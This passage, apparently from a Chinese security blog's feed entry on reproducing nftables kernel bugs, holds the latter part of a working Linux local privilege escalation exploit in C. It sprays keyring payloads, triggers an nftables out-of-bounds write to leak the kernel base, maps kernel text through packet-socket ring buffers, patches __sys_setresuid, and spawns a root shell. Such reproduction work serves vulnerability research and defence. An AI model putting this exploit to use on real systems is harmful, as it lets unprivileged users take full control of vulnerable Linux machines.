<span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set_elem</span> *<span class="title">element2</span> =</span> nftnl_set_elem_alloc();</span><br><span class="line">    <span class="keyword">int</span> verdict = NFT_CONTINUE;</span><br><span class="line">    nftnl_set_elem_set(element2, NFTNL_SET_ELEM_KEY, key_buf, key_len);</span><br><span class="line">    nftnl_set_elem_set(element2, NFTNL_SET_ELEM_VERDICT, &amp;verdict, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    nftnl_set_elem_add(set_stable, element);</span><br><span class="line">    nftnl_set_elem_add(set_stable, element2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE * <span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"></span><br><span class="line">    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                NFT_MSG_NEWSETELEM, family,</span><br><span class="line">                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,</span><br><span class="line">                                seq++);</span><br><span class="line">    nftnl_set_elems_nlmsg_build_payload(nlh, set_stable);</span><br><span class="line">    nftnl_set_free(set_stable);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting set_elem down\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">                          mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">add_key</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *type, <span class="keyword">const</span> <span class="keyword">char</span> *description, <span class="keyword">const</span> <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen, <span class="keyword">int</span> ringid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, type, description, payload, plen, ringid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">keyctl</span><span class="params">(<span class="keyword">int</span> operation, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_keyring</span><span class="params">(<span class="keyword">int</span> *id_buffer, <span class="keyword">uint32_t</span> spray_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> key_desc[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">char</span> key_payload[KEY_PAYLOAD_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, <span class="keyword">sizeof</span>(key_desc), <span class="string">&quot;spray_key_%d&quot;</span>, i);</span><br><span class="line">        <span class="built_in">memset</span>(key_payload, <span class="string">&#x27;A&#x27;</span>, KEY_PAYLOAD_SIZE);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, key_desc, key_payload, <span class="built_in">strlen</span>(key_payload),</span><br><span class="line">                                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">            <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">                usleep(<span class="number">100</span> * <span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;add_key %d: %m&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_keyring_corrupted</span><span class="params">(<span class="keyword">int</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">int</span> *corrupted_key_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[CORRUPT_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!id_buffer[i])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        keylen = keyctl(KEYCTL_READ, id_buffer[i], (<span class="keyword">long</span>)buffer, CORRUPT_SIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (keylen &lt; <span class="number">0</span>)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;keyctl: %m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (keylen == CORRUPT_SIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            *corrupted_key_id = id_buffer[i];</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">get_keyring_leak</span><span class="params">(<span class="keyword">int</span> id_buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *buffer = <span class="built_in">malloc</span>(CORRUPT_SIZE);</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line"></span><br><span class="line">    keylen = keyctl(KEYCTL_READ, id_buffer, (<span class="keyword">long</span>)buffer, CORRUPT_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (keylen &lt; <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;keyctl: %m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keylen == CORRUPT_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *ptr = buffer;</span><br><span class="line">        ptr += (<span class="number">128</span> - <span class="number">24</span>);</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; (<span class="keyword">char</span> *)buffer + CORRUPT_SIZE - <span class="number">128</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((*(<span class="keyword">uint64_t</span> *)(ptr + <span class="number">0x18</span>) == <span class="number">0x4141414141414141</span>) &amp;&amp;</span><br><span class="line">                (*(<span class="keyword">uint64_t</span> *)(ptr + <span class="number">8</span>) != <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;find user_key_payload rcu.func!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> *(<span class="keyword">uint64_t</span> *)(ptr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">128</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_key</span><span class="params">(<span class="keyword">int</span> id_buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id_buffer)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;keyctl(KEYCTL_REVOKE): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_keys</span><span class="params">(<span class="keyword">int</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        release_key(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">packet_socket_rx_ring_init</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">unsigned</span> <span class="keyword">int</span> block_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">unsigned</span> <span class="keyword">int</span> frame_size, <span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">unsigned</span> <span class="keyword">int</span> sizeof_priv, <span class="keyword">unsigned</span> <span class="keyword">int</span> timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="keyword">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;setsockopt(PACKET_VERSION): %m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;setsockopt(PACKET_RX_RING): %m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">packet_socket_setup</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> block_size, <span class="keyword">unsigned</span> <span class="keyword">int</span> frame_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr, <span class="keyword">unsigned</span> <span class="keyword">int</span> sizeof_priv, <span class="keyword">int</span> timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;socket(AF_PACKET): %m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">                               sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rv = bind(s, (struct sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;bind(AF_PACKET): %m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pagealloc_pad</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> writebuf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">leak_payload</span> <span class="title">leak_pay</span>;</span></span><br><span class="line">    <span class="keyword">int</span> id_buffer[SPRAY_KEY_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> corrupted_key_id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> kbase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line">    set_cpu_affinity(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_socket</span> *<span class="title">nl</span> =</span> mnl_socket_open(NETLINK_NETFILTER);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> leak_setid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> write_setid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    create_table(nl, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">    create_set(nl, <span class="string">&quot;leak&quot;</span>, KMALLOC64_KEYLEN, <span class="keyword">sizeof</span>(struct leak_payload), NFT_DATA_VALUE, <span class="string">&quot;table&quot;</span>, leak_setid);</span><br><span class="line">    create_set(nl, <span class="string">&quot;write&quot;</span>, KMALLOC64_KEYLEN, <span class="keyword">sizeof</span>(struct write_payload), NFT_DATA_VALUE, <span class="string">&quot;table&quot;</span>, write_setid);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spraying user_key_payload ...\n&quot;</span>);</span><br><span class="line">    spray_keyring(id_buffer, SPRAY_KEY_CNT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free some key to create holes ...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_KEY_CNT; i += FREE_HOLE_STEP)</span><br><span class="line">    &#123;</span><br><span class="line">        release_key(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;trigger oob write ...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x2000</span>);</span><br><span class="line">    leak_pay.len = CORRUPT_SIZE;</span><br><span class="line">    create_setelem(nl, buf, KMALLOC64_KEYLEN, &amp;leak_pay, <span class="keyword">sizeof</span>(struct leak_payload), <span class="string">&quot;leak&quot;</span>, <span class="string">&quot;table&quot;</span>, leak_setid);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;checking if keyring is corrupted ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_keyring_corrupted(id_buffer, SPRAY_KEY_CNT, &amp;corrupted_key_id))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;found keyring %d is corrupted!&quot;</span>, corrupted_key_id);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        release_keys(id_buffer, SPRAY_KEY_CNT);</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;can&#x27;t found corrupted keyring ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free other keyring to set rcu.func in user_key_payload ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_KEY_CNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] == corrupted_key_id)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        release_key(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;searching rcu.func ...&quot;</span>);</span><br><span class="line">    leak_ptr = get_keyring_leak(corrupted_key_id);</span><br><span class="line">    <span class="keyword">if</span> (!leak_ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;leak rcu.func failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak user_free_payload_rcu: 0x%08lx\n&quot;</span>, leak_ptr);</span><br><span class="line">    kbase = leak_ptr - <span class="number">0x51b0a0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak kbase: 0x%08lx\n&quot;</span>, kbase);</span><br><span class="line">    <span class="keyword">if</span> (kbase &amp; <span class="number">0xFFF</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;wrong offset!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> packet_fds[PACKET_SPRAY_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fengshui_fds[PACKET_FENGSHUI_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_payload</span> <span class="title">write_pay</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;write_pay, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct write_payload));</span><br><span class="line">    write_pay.pg_vec = (<span class="keyword">void</span> *)((kbase + <span class="number">0xdf530</span>) &amp; ~<span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;use raw_packet to fenghsui kmalloc-64 ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_FENGSHUI_CNT; i++)</span><br><span class="line">        fengshui_fds[i] = pagealloc_pad(KMALLOC64_PAGE_CNT, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;spraying pg_vec in kmalloc-64 ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        packet_fds[i] = pagealloc_pad(KMALLOC64_PAGE_CNT, <span class="number">0x1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free some pg_vec to create holes ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i += PACKET_FREE_HOLE_STEP)</span><br><span class="line">    &#123;</span><br><span class="line">        close(packet_fds[i]);</span><br><span class="line">        packet_fds[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;trigger oob write ...&quot;</span>);</span><br><span class="line">    create_setelem(nl, buf, KMALLOC64_KEYLEN, &amp;write_pay, <span class="keyword">sizeof</span>(struct write_payload), <span class="string">&quot;write&quot;</span>, <span class="string">&quot;table&quot;</span>, write_setid);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;searching edited page ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!packet_fds[i])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, PAGE_SIZE * KMALLOC64_PAGE_CNT,</span><br><span class="line">                                  PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds[i], <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!page || (<span class="keyword">ssize_t</span>)page &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error: %p\n&quot;</span>, page);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0x30</span>; j &lt; <span class="number">0x1000</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (page[j] != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// found non-empty page</span></span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">0x1000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;found target page!!&quot;</span>);</span><br><span class="line">            print_hex(page, <span class="number">0x100</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;patching __sys_setresuid jne to jmp ...&quot;</span>);</span><br><span class="line">            page[(kbase + <span class="number">0xdf530</span> + <span class="number">0xc9</span>) &amp; <span class="number">0xfff</span>] = <span class="number">0xeb</span>;</span><br><span class="line"></span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;can&#x27;t found target page&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_FENGSHUI_CNT; i++)</span><br><span class="line">        close(fengshui_fds[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i++)</span><br><span class="line">        close(packet_fds[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p><a class="link"   href="https://github.com/randorisec/CVE-2022-34918-LPE-PoC" >https://github.com/randorisec/CVE-2022-34918-LPE-PoC<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://tttang.com/archive/1706/" >https://tttang.com/archive/1706/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://vul.360.net/archives/391" >https://vul.360.net/archives/391<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇应该是关于nftables类型的最后一篇有写exp的文章，在后续的复现文章只会进行漏洞分析以及利用手法分析。&lt;/p&gt;
&lt;h2 id=&quot;e</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="netfilter" scheme="https://196082.github.io/tags/netfilter/"/>
    
    <category term="nftables" scheme="https://196082.github.io/tags/nftables/"/>
    
    <category term="netlink" scheme="https://196082.github.io/tags/netlink/"/>
    
    <category term="user_key_payload" scheme="https://196082.github.io/tags/user-key-payload/"/>
    
    <category term="USMA" scheme="https://196082.github.io/tags/USMA/"/>
    
  </entry>
  
  <entry>
    <title>nftables子系统浅分析</title>
    <link href="https://196082.github.io/2024/08/17/nftables/"/>
    <id>https://196082.github.io/2024/08/17/nftables/</id>
    <published>2024-08-16T17:56:39.000Z</published>
    <updated>2024-08-16T17:55:08.000Z</updated>
    
